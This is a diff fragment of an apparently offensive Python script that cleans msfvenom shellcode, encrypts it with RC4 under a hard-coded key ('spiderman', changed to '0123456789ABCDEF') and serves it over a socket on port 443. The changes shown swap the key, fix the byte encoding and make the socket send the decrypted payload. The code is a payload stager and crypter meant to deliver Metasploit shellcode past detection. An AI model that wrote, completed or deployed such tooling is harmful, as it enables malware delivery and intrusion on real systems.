@@ -34,12 +34,15 @@ def clean_payload_msfvenom(file):
 		payload_readed = payload_readed.replace(' ','')
 		payload_readed = payload_readed.replace('\\x','')
 		payload_readed = payload_readed.replace('\n','')
-		print('+ Payload loaded and cleaned')
 
 		return payload_readed
 
 	except IOError:
 		print('+ It could not be possible to open the payload file, something went wrong!!')
+
+#--------------------------------------------------------------------------------------------------------------
+
+
 
 #--------------------------------------------------------------------------------------------------------------
 
@@ -112,7 +115,7 @@ if __name__ == '__main__':
 
 	#Variables to define the environment
 	#password for RC4 crypter
-	password = 'spiderman'
+	password = '0123456789ABCDEF'
 	#IP address and port for socket to send backport payload
 	ip_address = '0.0.0.0'
 	port = 443
@@ -136,7 +139,7 @@ if __name__ == '__main__':
 	
 	print('\n')
 	print('+ + Payload encrypted: ')
-	payload_encrypted = encrypt_payload(payload_cleaned, password)
+	payload_encrypted = encrypt_payload(bytes(payload_cleaned, 'utf-8'), password)
 	print(payload_encrypted.hex())
 	print(payload_encrypted)
 
@@ -149,7 +152,7 @@ if __name__ == '__main__':
 	print('\n')
 
 	#Create the socket, listen, send the payload and close it
-	create_socket(ip_address, port, payload_encrypted)
+	create_socket(ip_address, port, payload_decrypted)
 
 	print('\n')
 	write_screen('Script finished')
